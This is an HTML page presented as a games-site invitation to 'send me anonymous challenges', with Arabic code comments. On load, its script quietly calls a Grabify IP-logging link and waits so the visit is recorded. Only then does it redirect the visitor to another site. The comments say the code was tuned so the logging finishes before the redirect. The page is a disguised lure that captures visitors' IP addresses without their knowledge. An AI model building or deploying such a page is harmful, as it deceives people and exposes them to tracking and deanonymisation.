<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send me anonymous challenges on GamesZoneX!</title>
  <!-- تم حذف وسم meta refresh لأنه كان يخرب العملية ويسرع التحويل قبل التسجيل -->
</head>
<body>

  <script>
    // هذه الدالة ستبدأ بالعمل فوراً عند فتح الصفحة
    async function logAndRedirect() {
      const grabifyUrl = 'https://grabify.link'; 
      const destinationUrl = 'https://dominoes.mx';

      try {
        // استخدام await يجبر المتصفح على الانتظار لحين انتهاء الاتصال بـ Grabify
        await fetch(grabifyUrl, { 
          mode: 'no-cors',
          cache: 'no-cache',
          credentials: 'omit'
        });
        
        // ننتظر نصف ثانية إضافية احتياطاً للتأكد من معالجة السيرفر للطلب
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (e) {
        console.log('Error logging');
      } finally {
        // الآن يتم التحويل إلى الموقع الآخر بأمان بعد الضمان
        window.location.href = destinationUrl;
      }
    }

    // تشغيل الدالة بمجرد تحميل الصفحة
    window.addEventListener("load", logAndRedirect);
  </script>
</body>
</html>
